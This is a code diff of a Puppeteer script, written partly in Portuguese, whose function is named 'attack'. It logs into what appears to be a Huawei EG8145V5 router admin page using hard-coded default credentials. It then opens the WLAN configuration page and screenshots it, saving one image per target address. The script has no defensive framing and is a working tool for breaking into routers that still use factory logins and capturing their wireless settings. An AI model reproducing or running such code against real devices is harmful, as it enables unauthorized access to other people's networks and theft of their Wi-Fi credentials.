@@ -1,30 +1,31 @@
-export default async function attackEG8145V5(page, endereco) {
-    {
-        await page.focus("#txt_Username");
-        await page.keyboard.type("Epadmin");
-    }
-    {
-        await page.focus("#txt_Password");
-        await page.keyboard.type("adminEp");
-    }
-    {
-        await page.click("#loginbutton")
-    }
-    {
-        await page.waitForTimeout(5000);
-        await page.click("#name_addconfig")
-    }
-    {
-        await page.click("#name_wlanconfig");
-    }
-    {
-        await page.waitForTimeout(5000);
-        const enderecoUrlFoto = endereco
-            .replace("http://", "");
+const defaultUsername = "Epadmin";
+const defaultPassword = "adminEp";
 
-        await page.screenshot({
-            path: `./fotos/${enderecoUrlFoto}.png`,
-            fullPage: true
-        });
-    }
+export default async function attack(page, endereco) {
+
+    await (await page.waitForSelector("#txt_Username", {
+        timeout: 5000
+    })).focus();
+    await page.keyboard.type(defaultUsername);
+
+    await (await page.waitForSelector("#txt_Password", {
+        timeout: 5000
+    })).focus();
+    await page.keyboard.type(defaultPassword);
+
+    await page.click("#loginbutton");
+
+    await (await page.waitForSelector("#name_addconfig", {
+        timeout: 2000
+    })).click();
+
+    await (await page.waitForSelector("#name_wlanconfig", {
+        timeout: 2000
+    })).click();
+
+    await page.waitForTimeout(4000);
+    await page.screenshot({
+        path: `./fotos/${endereco}.png`
+    });
+
 }
